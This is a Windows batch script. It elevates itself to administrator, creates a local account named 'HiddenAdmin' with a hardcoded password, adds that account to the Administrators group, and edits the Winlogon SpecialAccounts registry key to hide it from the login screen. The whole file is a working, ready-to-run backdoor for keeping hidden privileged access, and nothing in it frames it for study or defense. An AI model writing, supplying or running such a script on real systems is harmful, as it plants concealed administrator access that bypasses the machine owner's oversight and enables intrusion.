@echo off
:: Elevate if not already elevated
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Need elevation. Relaunching as admin...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: Set username and password here
set "username=HiddenAdmin"
set "password=Password@123"

echo.
echo Creating hidden administrator account: %username%
echo.

:: Create the user account
net user %username% %password% /add
if errorlevel 1 (
    echo Failed to create user %username%.
    goto :end
)

:: Add user to Administrators group
net localgroup Administrators %username% /add
if errorlevel 1 (
    echo Failed to add %username% to Administrators group.
    goto :end
)

:: Hide the user from login/lock screen
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %username% /t REG_DWORD /d 0 /f
if errorlevel 1 (
    echo Failed to hide user %username% from login screen.
    goto :end
)

echo.
echo Account %username% created and hidden successfully.
echo.

:end
pause
